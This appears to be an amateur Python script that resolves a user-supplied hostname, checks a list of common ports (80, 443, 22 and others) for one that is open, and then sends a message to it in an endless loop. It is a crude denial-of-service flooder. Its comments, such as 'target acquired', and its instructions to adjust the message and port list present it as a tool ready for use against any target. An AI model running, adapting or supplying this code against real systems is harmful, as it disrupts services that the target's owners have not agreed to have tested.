import socket
idk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = socket.gethostbyname(input())
print (ip)
brizz = True
print("target acquired")
m = 'greetings' #ts is the message change it if you want
e = m.encode()
p = 0
port_list = [80, 443, 8080, 22, 21, 91] # this is the port list (obv) change it if u alr know the port
for port in port_list:
 idk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 rizz = idk.connect_ex((ip, port))
 if rizz == 0:
  md = port
  if brizz == True:
   while brizz:
      idk.send(e)
 else:
  print("no port...")

